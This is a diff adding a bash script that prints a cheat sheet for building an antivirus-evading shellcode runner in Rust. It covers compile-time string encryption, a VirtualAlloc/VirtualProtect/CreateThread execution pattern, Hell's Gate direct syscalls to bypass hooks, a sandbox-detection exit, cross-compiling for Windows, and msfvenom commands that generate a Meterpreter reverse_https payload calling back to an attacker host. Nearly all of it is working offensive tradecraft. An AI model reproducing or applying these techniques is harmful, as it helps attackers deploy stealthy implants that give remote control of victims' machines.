@@ -1,0 +1,64 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── RUST — AV BYPASS SHELLCODE RUNNER ────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Cargo.toml ───────────────────────────────────────${NC}"
+echo -e "  ${GREEN}[dependencies]${NC}"
+echo -e "  ${GREEN}winapi = { version = \"0.3\", features = [\"memoryapi\",\"processthreadsapi\",\"synchapi\",\"winbase\",\"winnt\"] }${NC}"
+echo -e "  ${GREEN}litcrypt2 = \"0.1\"${NC}"
+echo -e "  ${GREEN}[profile.release]${NC}"
+echo -e "  ${GREEN}opt-level = 3; strip = true; panic = \"abort\"; lto = true; codegen-units = 1${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── litcrypt2 String Encryption ──────────────────────${NC}"
+echo -e "  ${GREEN}#[macro_use] extern crate litcrypt2;${NC}"
+echo -e "  ${GREEN}use_litcrypt!();${NC}"
+echo -e "  ${GREEN}let lib = lc!(\"kernel32.dll\");${NC}                  # encrypted at compile time"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── W^X Shellcode Runner Pattern ─────────────────────${NC}"
+echo -e "  ${GREEN}// 1. Alloc RW memory${NC}"
+echo -e "  ${GREEN}let mem = VirtualAlloc(ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);${NC}"
+echo -e "  ${GREEN}// 2. Write shellcode${NC}"
+echo -e "  ${GREEN}ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());${NC}"
+echo -e "  ${GREEN}// 3. Change to RX${NC}"
+echo -e "  ${GREEN}let mut old = 0u32;${NC}"
+echo -e "  ${GREEN}VirtualProtect(mem, shellcode.len(), PAGE_EXECUTE_READ, &mut old);${NC}"
+echo -e "  ${GREEN}// 4. Execute${NC}"
+echo -e "  ${GREEN}let thread = CreateThread(ptr::null_mut(), 0, Some(std::mem::transmute(mem as *const ())), ptr::null_mut(), 0, ptr::null_mut());${NC}"
+echo -e "  ${GREEN}WaitForSingleObject(thread, INFINITE);${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Hell's Gate Direct Syscall ───────────────────────${NC}"
+echo -e "  ${GREEN}// Parse ntdll.dll export table to find syscall number${NC}"
+echo -e "  ${GREEN}// Execute syscall with inline asm — bypasses user-mode hooks${NC}"
+echo -e "  ${GREEN}unsafe { asm!(\"syscall\", in(\"rax\") syscall_num, ...) }${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── VirtualAllocExNuma Sandbox Gate ──────────────────${NC}"
+echo -e "  ${GREEN}let mem = VirtualAllocExNuma(GetCurrentProcess(), ptr::null_mut(), 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE, 0);${NC}"
+echo -e "  ${GREEN}if mem.is_null() { return; }${NC}                     # sandbox returns null -> exit"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Cross-Compile from Linux ─────────────────────────${NC}"
+echo -e "  ${GREEN}rustup target add x86_64-pc-windows-gnu${NC}"
+echo -e "  ${GREEN}sudo apt install gcc-mingw-w64-x86-64${NC}"
+echo -e "  ${GREEN}LITCRYPT_ENCRYPT_KEY=\"mysecretkey123\" cargo build --release --target x86_64-pc-windows-gnu${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Shellcode for Rust ───────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f raw > sc.bin${NC}"
+echo -e "  ${GREEN}let shellcode: &[u8] = include_bytes!(\"sc.bin\");${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f rust${NC}  # as Rust array"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
